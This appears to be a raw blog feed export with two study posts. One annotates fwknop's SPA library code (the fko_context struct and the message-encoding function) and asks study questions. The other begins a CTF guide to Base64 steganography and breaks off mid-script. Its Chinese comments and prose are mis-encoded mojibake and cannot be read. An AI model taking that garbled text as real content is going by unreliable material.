class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fko_context</span> &#123;</span><br>    <span class="hljs-comment">/** \name FKO SPA user-definable message data */</span><br><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *rand_val; <span class="hljs-comment">//éšæœºå€¼</span><br>    <span class="hljs-type">char</span>           *username; <span class="hljs-comment">//ç”¨æˆ·å</span><br>    <span class="hljs-type">time_t</span>          timestamp; <span class="hljs-comment">//æ—¶é—´æˆ³</span><br>    <span class="hljs-type">short</span>           message_type; <span class="hljs-comment">//æ¶ˆæ¯ç±»å‹ï¼Œè¡¨ç¤ºmessageå­—æ®µçš„å†…å®¹ç±»å‹ã€‚</span><br>    <span class="hljs-type">char</span>           *message; <span class="hljs-comment">//ç”¨æˆ·è‡ªå®šä¹‰çš„æ¶ˆæ¯æ•°æ®ã€‚</span><br>    <span class="hljs-type">char</span>           *nat_access; <span class="hljs-comment">//NATï¼ˆNetwork Address Translationï¼‰è®¿é—®å­—ç¬¦ä¸²ï¼Œç”¨äºå¤„ç†NATç©¿é€ã€‚</span><br>    <span class="hljs-type">char</span>           *server_auth; <span class="hljs-comment">//æœåŠ¡å™¨è®¤è¯ä¿¡æ¯</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    client_timeout; <span class="hljs-comment">//å®¢æˆ·ç«¯è¶…æ—¶æ—¶é—´ï¼Œè¡¨ç¤ºä¸€æ¬¡è¯·æ±‚çš„æœ‰æ•ˆæœŸ</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name FKO SPA user-settable message encoding types */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">short</span>  digest_type; <span class="hljs-comment">//æ‘˜è¦ç±»å‹ï¼Œç”¨äºæ¶ˆæ¯æ‘˜è¦çš„ç®—æ³•ç±»å‹ã€‚</span><br>    <span class="hljs-type">short</span>  encryption_type; <span class="hljs-comment">//åŠ å¯†ç±»å‹ï¼Œè¡¨ç¤ºæ¶ˆæ¯çš„åŠ å¯†ç®—æ³•ç±»å‹ã€‚</span><br>    <span class="hljs-type">int</span>    encryption_mode; <span class="hljs-comment">//åŠ å¯†æ¨¡å¼ï¼Œè¡¨ç¤ºåŠ å¯†ç®—æ³•çš„æ¨¡å¼ï¼ˆä¾‹å¦‚ï¼ŒECBï¼ŒCBCç­‰ï¼‰</span><br>    <span class="hljs-type">short</span>  hmac_type; <span class="hljs-comment">//HMACï¼ˆHash-based Message Authentication Codeï¼‰ç±»å‹ï¼Œç”¨äºæ¶ˆæ¯è®¤è¯ç çš„ç®—æ³•ç±»å‹</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Computed or predefined data */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *version; <span class="hljs-comment">//ç‰ˆæœ¬ä¿¡æ¯</span><br>    <span class="hljs-type">char</span>           *digest; <span class="hljs-comment">//æ¶ˆæ¯æ‘˜è¦ï¼Œç”¨äºæ•°æ®å®Œæ•´æ€§éªŒè¯</span><br>    <span class="hljs-type">int</span>             digest_len; <span class="hljs-comment">//æ¶ˆæ¯æ‘˜è¦çš„é•¿åº¦</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Digest of raw encrypted/base64 data</span><br><span class="hljs-comment">     * This is used for replay attack detection</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *raw_digest; <span class="hljs-comment">//åŸå§‹åŠ å¯†/ç¼–ç æ•°æ®çš„æ‘˜è¦ï¼Œç”¨äºé˜²æ­¢é‡æ”¾æ”»å‡»</span><br>    <span class="hljs-type">short</span>           raw_digest_type; <span class="hljs-comment">//åŸå§‹åŠ å¯†/ç¼–ç æ•°æ®çš„æ‘˜è¦ç±»å‹</span><br>    <span class="hljs-type">int</span>             raw_digest_len; <span class="hljs-comment">//åŸå§‹åŠ å¯†/ç¼–ç æ•°æ®çš„æ‘˜è¦é•¿åº¦</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name Computed processed data (encodings, etc.) */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *encoded_msg; <span class="hljs-comment">//ç¼–ç åçš„æ¶ˆæ¯æ•°æ®</span><br>    <span class="hljs-type">int</span>             encoded_msg_len; <span class="hljs-comment">//ç¼–ç åçš„æ¶ˆæ¯æ•°æ®é•¿åº¦</span><br>    <span class="hljs-type">char</span>           *encrypted_msg; <span class="hljs-comment">//åŠ å¯†åçš„æ¶ˆæ¯æ•°æ®</span><br>    <span class="hljs-type">int</span>             encrypted_msg_len; <span class="hljs-comment">//åŠ å¯†åçš„æ¶ˆæ¯æ•°æ®é•¿åº¦</span><br>    <span class="hljs-type">char</span>           *msg_hmac; <span class="hljs-comment">//æ¶ˆæ¯è®¤è¯ç </span><br>    <span class="hljs-type">int</span>             msg_hmac_len; <span class="hljs-comment">//æ¶ˆæ¯è®¤è¯ç çš„é•¿åº¦</span><br>    <span class="hljs-type">int</span>             added_salted_str; <span class="hljs-comment">//æ ‡è®°æ˜¯å¦æ·»åŠ äº†ç›å€¼å­—ç¬¦ä¸²</span><br>    <span class="hljs-type">int</span>             added_gpg_prefix; <span class="hljs-comment">//æ ‡è®°æ˜¯å¦æ·»åŠ äº†GPGï¼ˆGNU Privacy Guardï¼‰å‰ç¼€</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br>    <span class="hljs-comment">/** \name State info */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    state; <span class="hljs-comment">//çŠ¶æ€ä¿¡æ¯ï¼Œè¡¨ç¤ºå½“å‰ä¸Šä¸‹æ–‡çš„çŠ¶æ€ã€‚</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   initval; <span class="hljs-comment">//åˆå§‹åŒ–å€¼ã€‚</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBGPGME</span><br>    <span class="hljs-comment">/** \name For gpgme support */</span><br>    <span class="hljs-comment">/*@&#123;*/</span><br>    <span class="hljs-type">char</span>           *gpg_exe; <span class="hljs-comment">//GPGæ‰§è¡Œç¨‹åºè·¯å¾„</span><br>    <span class="hljs-type">char</span>           *gpg_recipient; <span class="hljs-comment">//GPGæ¥æ”¶è€…ï¼ˆç”¨äºåŠ å¯†å’Œè§£å¯†ï¼‰</span><br>    <span class="hljs-type">char</span>           *gpg_signer; <span class="hljs-comment">//GPGç­¾åè€…ï¼ˆç”¨äºç­¾åå’ŒéªŒè¯ï¼‰</span><br>    <span class="hljs-type">char</span>           *gpg_home_dir; <span class="hljs-comment">//GPGçš„ä¸»ç›®å½•</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   have_gpgme_context; <span class="hljs-comment">//æ˜¯å¦æœ‰GPGMEï¼ˆGnuPG Made Easyï¼‰ä¸Šä¸‹æ–‡</span><br><br>    <span class="hljs-type">gpgme_ctx_t</span>     gpg_ctx; <span class="hljs-comment">//GPGMEä¸Šä¸‹æ–‡</span><br>    <span class="hljs-type">gpgme_key_t</span>     recipient_key; <span class="hljs-comment">//GPGæ¥æ”¶è€…å¯†é’¥</span><br>    <span class="hljs-type">gpgme_key_t</span>     signer_key; <span class="hljs-comment">//GPGç­¾åè€…å¯†é’¥</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   verify_gpg_sigs; <span class="hljs-comment">//æ˜¯å¦éªŒè¯GPGç­¾å</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   ignore_gpg_sig_error; <span class="hljs-comment">//æ˜¯å¦å¿½ç•¥GPGç­¾åé”™è¯¯</span><br><br>    <span class="hljs-type">fko_gpg_sig_t</span>   gpg_sigs; <span class="hljs-comment">//GPGç­¾åä¿¡æ¯</span><br><br>    <span class="hljs-type">gpgme_error_t</span>   gpg_err; <span class="hljs-comment">//GPGé”™è¯¯ä¿¡æ¯</span><br>    <span class="hljs-comment">/*@&#125;*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HAVE_LIBGPGME */</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="é—®é¢˜1">é—®é¢˜1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">fko_encode_spa_data</span><span class="hljs-params">(<span class="hljs-type">fko_ctx_t</span> ctx)</span><br>&#123;<br>    <span class="hljs-type">int</span>     res, offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>   *tbuf;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_init&quot;</span>, FKO_ERROR_CTX_NOT_INITIALIZED);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* Must be initialized</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(!CTX_INITIALIZED(ctx))<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_CTX_NOT_INITIALIZED);<br><br>    <span class="hljs-comment">/* Check prerequisites.</span><br><span class="hljs-comment">     * --DSS <span class="hljs-doctag">XXX:</span>  Needs review.  Also, we could make this more robust (or</span><br><span class="hljs-comment">     *             (at leaset expand the error reporting for the missing</span><br><span class="hljs-comment">     *             data).</span><br><span class="hljs-comment">    */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_valid&quot;</span>, FKO_ERROR_INCOMPLETE_SPA_DATA);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span>(  validate_username(ctx-&gt;username) != FKO_SUCCESS<br>      || ctx-&gt;version  == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;version, MAX_SPA_VERSION_SIZE)  == <span class="hljs-number">0</span><br>      || ctx-&gt;message  == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;message, MAX_SPA_MESSAGE_SIZE)  == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_INCOMPLETE_SPA_DATA);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(ctx-&gt;message_type == FKO_NAT_ACCESS_MSG)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(ctx-&gt;nat_access == <span class="hljs-literal">NULL</span> || strnlen(ctx-&gt;nat_access, MAX_SPA_MESSAGE_SIZE) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span>(FKO_ERROR_INCOMPLETE_SPA_DATA);<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_encode_spa_data_calloc&quot;</span>, FKO_ERROR_MEMORY_ALLOCATION);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* Allocate our initial tmp buffer.</span><br><span class="hljs-comment">    */</span><br>    tbuf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>    <span class="hljs-keyword">if</span>(tbuf == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_MEMORY_ALLOCATION);<br><br>    <span class="hljs-comment">/* Put it together a piece at a time, starting with the rand val.</span><br><span class="hljs-comment">    */</span><br>    strlcpy(tbuf, ctx-&gt;rand_val, FKO_ENCODE_TMP_BUF_SIZE);<br><br>    <span class="hljs-comment">/* Add the base64-encoded username.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">/*-----------------------------------------------------------------*/</span><br>    strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE); <span class="hljs-comment">//åªæ·»åŠ äº†ä¸€ä¸ªå†’å·ï¼Œä¸ºä»€ä¹ˆé•¿åº¦è¦æ˜¯1024</span><br>    <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;username)) != FKO_SUCCESS)<br>    &#123;<br>        <span class="hljs-built_in">free</span>(tbuf);<br>        <span class="hljs-keyword">return</span>(res);<br>    &#125;<br><br>    <span class="hljs-comment">/* Add the timestamp.</span><br><span class="hljs-comment">    */</span><br>    offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>    <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%u:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) ctx-&gt;timestamp);<br><br>    <span class="hljs-comment">/* Add the version string.</span><br><span class="hljs-comment">    */</span><br>    strlcat(tbuf, ctx-&gt;version, FKO_ENCODE_TMP_BUF_SIZE);<br><br>    <span class="hljs-comment">/* Before we add the message type value, we will once again</span><br><span class="hljs-comment">     * check for whether or not a client_timeout was specified</span><br><span class="hljs-comment">     * since the message_type was set.  If this is the case, then</span><br><span class="hljs-comment">     * we want to adjust the message_type first.  The easy way</span><br><span class="hljs-comment">     * to do this is simply call fko_set_spa_client_timeout and set</span><br><span class="hljs-comment">     * it to its current value.  This will force a re-check and</span><br><span class="hljs-comment">     * possible reset of the message type.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    */</span><br>    fko_set_spa_client_timeout(ctx, ctx-&gt;client_timeout);<br><br>    <span class="hljs-comment">/* Add the message type value.</span><br><span class="hljs-comment">    */</span><br>    offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>    <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%i:&quot;</span>, ctx-&gt;message_type);<br><br>    <span class="hljs-comment">/* Add the base64-encoded SPA message.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;message)) != FKO_SUCCESS)<br>    &#123;<br>        <span class="hljs-built_in">free</span>(tbuf);<br>        <span class="hljs-keyword">return</span>(res);<br>    &#125;<br><br>    <span class="hljs-comment">/* If a nat_access message was given, add it to the SPA</span><br><span class="hljs-comment">     * message.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;nat_access != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>        <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;nat_access)) != FKO_SUCCESS)<br>        &#123;<br>            <span class="hljs-built_in">free</span>(tbuf);<br>            <span class="hljs-keyword">return</span>(res);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* If we have a server_auth field set.  Add it here.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;server_auth != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br>        <span class="hljs-keyword">if</span>((res = append_b64(tbuf, ctx-&gt;server_auth)) != FKO_SUCCESS)<br>        &#123;<br>            <span class="hljs-built_in">free</span>(tbuf);<br>            <span class="hljs-keyword">return</span>(res);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* If a client timeout is specified and we are not dealing with a</span><br><span class="hljs-comment">     * SPA command message, add the timeout here.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;client_timeout &gt; <span class="hljs-number">0</span> &amp;&amp; ctx-&gt;message_type != FKO_COMMAND_MSG)<br>    &#123;<br>        offset = <span class="hljs-built_in">strlen</span>(tbuf);<br>        <span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>                <span class="hljs-string">&quot;:%i&quot;</span>, ctx-&gt;client_timeout);<br>    &#125;<br><br>    <span class="hljs-comment">/* If encoded_msg is not null, then we assume it needs to</span><br><span class="hljs-comment">     * be freed before re-assignment.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(ctx-&gt;encoded_msg != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-built_in">free</span>(ctx-&gt;encoded_msg);<br><br>    <span class="hljs-comment">/* Copy our encoded data into the context.</span><br><span class="hljs-comment">    */</span><br>    ctx-&gt;encoded_msg = strdup(tbuf);<br>    <span class="hljs-built_in">free</span>(tbuf);<br><br>    <span class="hljs-keyword">if</span>(ctx-&gt;encoded_msg == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_MEMORY_ALLOCATION);<br><br>    ctx-&gt;encoded_msg_len = strnlen(ctx-&gt;encoded_msg, MAX_SPA_ENCODED_MSG_SIZE);<br><br>    <span class="hljs-keyword">if</span>(! is_valid_encoded_msg_len(ctx-&gt;encoded_msg_len))<br>        <span class="hljs-keyword">return</span>(FKO_ERROR_INVALID_DATA_ENCODE_MSGLEN_VALIDFAIL);<br><br>    <span class="hljs-comment">/* At this point we can compute the digest for this SPA data.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>((res = fko_set_spa_digest(ctx)) != FKO_SUCCESS)<br>        <span class="hljs-keyword">return</span>(res);<br><br>    <span class="hljs-comment">/* Here we can clear the modified flags on the SPA data fields.</span><br><span class="hljs-comment">    */</span><br>    FKO_CLEAR_SPA_DATA_MODIFIED(ctx);<br><br>    <span class="hljs-keyword">return</span>(FKO_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é—®é¢˜2">é—®é¢˜2</h3><p>ä¸ºä»€ä¹ˆä¸€ä¼šç”¨strcatä¸€ä¼šç”¨snprintfçš„æ–¹å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">strlcat(tbuf, <span class="hljs-string">&quot;:&quot;</span>, FKO_ENCODE_TMP_BUF_SIZE);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//è·å–å½“å‰çš„tbufçš„é•¿åº¦</span><br>offset = <span class="hljs-built_in">strlen</span>(tbuf);<br><span class="hljs-built_in">snprintf</span>(((<span class="hljs-type">char</span>*)tbuf+offset), FKO_ENCODE_TMP_BUF_SIZE - offset,<br>            <span class="hljs-string">&quot;:%u:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) ctx-&gt;timestamp);<br></code></pre></td></tr></table></figure><h3 id="é—®é¢˜3">é—®é¢˜3</h3><p>è¿™ä¸ªæ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆå‡ ä¹æ¯ä¸ªå‡½æ•°å‰é¢éƒ½æœ‰è¿™ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_LIBFIU</span><br>    fiu_return_on(<span class="hljs-string">&quot;fko_set_spa_digest_init&quot;</span>, FKO_ERROR_CTX_NOT_INITIALIZED);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>é›¶ä¿¡ä»»</tag>
      
      <tag>socketç¼–ç¨‹</tag>
      
      <tag>iptablesåŸç†</tag>
      
      <tag>TCP/IP</tag>
      
      <tag>SPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc</title>
    <link href="/2023/07/08/misc/"/>
    <url>/2023/07/08/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-MISCå­¦ä¹ æŒ‡å—">CTF-MISCå­¦ä¹ æŒ‡å—</h1><h2 id="Base64éšå†™">Base64éšå†™</h2><p>æƒ³äº†è§£base64çš„éšå†™é¦–å…ˆå°±å¾—çŸ¥é“å®ƒæ˜¯æ€ä¹ˆç¼–ç è§£ç çš„</p><h3 id="ç¼–ç ">ç¼–ç </h3><p>ç¼–ç æ—¶ï¼Œå°†è¦ç¼–ç çš„å†…å®¹è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼ˆä¸€ä¸ªå­—ç¬¦å¯¹åº”8ä½äºŒè¿›åˆ¶ï¼‰ï¼Œæ¯6ä½ä½œä¸ºä¸€ç»„ï¼Œä»ç´¢å¼•è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ï¼Œçš„ä½ç½®è¡¥0ï¼Œæœ€åä¸è¶³å››ä½çš„è¡¥=</p><h3 id="è§£ç ">è§£ç </h3><p>ç¼–ç æ—¶è¡¥å……äº†0å¢åŠ ç­‰å·ï¼Œè§£ç æ—¶å»é™¤ç­‰å·å¹¶å¯¹åº”åˆ é™¤ç¼–ç æ—¶è¡¥å……çš„0ï¼Œæ­£å› ä¸ºè¿™ä¸€ç‚¹ï¼Œä½¿éšå†™æˆä¸ºå¯èƒ½ã€‚</p><p>ä¸Šè¿°æ‰€è¯´çš„è¡¥ä½0æ‰€åœ¨çš„ä½ç½®ï¼ŒåŠ å…¥æˆ‘ä»¬ä¿®æ”¹ä¸ºå…¶ä»–äºŒè¿›åˆ¶æ•°ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„å…¨0ï¼Œåœ¨åšbase64è§£ç çš„æ—¶å€™ï¼Œæ˜¯ä¸ä¼šå½±å“è§£ç ç»“æœçš„ï¼Œå› ä¸ºè¿™äº›è¡¥ä½0æ‰€åœ¨çš„ä½ç½®ï¼Œè§£ç æ—¶éƒ½ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥ä¸å½±å“è§£ç ç»“æœã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦éšè—ä¿¡æ¯çš„è¯ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›è¡¥ä½0æ‰€åœ¨çš„ä½ç½®ï¼Œbase64ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰1ä¸ªç­‰å·ï¼Œå°±æœ‰ä¸¤ä¸ªbitçš„è¡¥ä½0å¯éšå†™ï¼Œå¦‚æœæœ‰2ä¸ªç­‰å·ï¼Œå°±æœ‰å››ä¸ªbitçš„è¡¥ä½0å¯éšå†™ï¼›å¦‚æœæ²¡æœ‰ç­‰å·ï¼Œå°±æ²¡æœ‰è¡¥ä½0å¯éšå†™ã€‚</p><p>è´´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># ccc.txtä¸ºå¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²æ‰€åœ¨çš„æ–‡ä»¶</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base64.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>base64str = f.readline()<br><br><span class="hljs-comment"># pattern2ç”¨äºåŒ¹é…ä¸¤ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span><br><span class="hljs-comment"># 